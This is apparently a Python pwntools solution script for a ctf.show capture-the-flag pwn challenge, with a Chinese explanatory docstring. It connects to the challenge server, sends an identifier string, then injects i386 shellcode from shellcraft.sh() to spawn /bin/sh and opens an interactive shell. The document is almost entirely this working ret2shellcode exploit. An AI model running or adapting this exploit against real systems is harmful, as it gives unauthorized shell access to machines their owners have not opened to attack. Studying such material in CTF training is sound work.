from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

io = remote("pwn.challenge.ctf.show", 28297)
elf = ELF('./pwn')

# 等待提示信息，发送标识符
io.recvuntil(" ***************************************** ")
io.sendline("CTFShowPWN")

# 生成shellcode，使用shellcraft.sh()生成执行/bin/sh的shellcode
shellcode = asm(shellcraft.sh())

# 发送shellcode
io.sendline(shellcode)

io.interactive()

"""
【知识点讲解】
1. 题目类型：ret2shellcode - 32位shellcode执行
2. 核心原理：
   - 程序接收用户输入的shellcode
   - 执行shellcode获取shell
3. 关键步骤：
   - 发送标识符"CTFShowPWN"
   - 生成并发送shellcode
4. 执行流程：
   - 输入标识符 -> 发送shellcode -> 执行shellcode获取shell
5. 技术要点：
   - shellcode的生成和执行
   - 程序输入处理逻辑
"""
